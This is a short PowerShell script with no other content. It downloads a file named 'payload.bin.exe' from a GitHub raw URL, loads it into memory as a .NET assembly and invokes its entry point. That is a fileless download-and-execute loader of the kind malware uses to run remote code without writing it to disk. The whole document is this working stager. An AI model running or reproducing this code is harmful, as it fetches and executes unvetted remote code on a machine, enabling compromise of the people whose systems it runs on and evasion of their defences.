$url = "https://raw.githubusercontent.com/itsamanm/docs/main/payload.bin.exe"
$data = (New-Object System.Net.WebClient).DownloadData($url)
$assem = [System.Reflection.Assembly]::Load($data)
$assem.EntryPoint.Invoke($null, $null)